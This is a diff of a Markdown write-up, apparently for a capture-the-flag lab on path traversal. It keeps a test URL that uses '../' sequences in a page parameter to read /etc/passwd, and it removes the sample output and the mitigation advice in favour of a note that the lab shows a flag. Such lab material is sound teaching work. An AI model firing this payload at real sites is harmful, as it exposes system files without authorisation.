@@ -67,32 +67,12 @@ Why target this file?
 ### 3. Test the Vulnerability
 
 ```http
-http://IP/?page=../../../../../../../../etc/passwd
+http://site.com/?page=../../../../../../../../etc/passwd
 ```
 
 If the content of the file is displayed, the vulnerability is confirmed.
 
----
-
-## Example Output
-
-```txt
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-user:x:1000:1000:user:/home/user:/bin/bash
-```
-
----
-
-## Mitigation
-
-To protect against Path Traversal vulnerabilities:
-
-- Validate and sanitize user input
-- Use a whitelist of allowed files
-- Prevent direct access to sensitive files
-- Use secure absolute paths
-- Avoid using user input directly in file paths
+For us, the Flag will be displayed instead of the content.
 
 ---
 
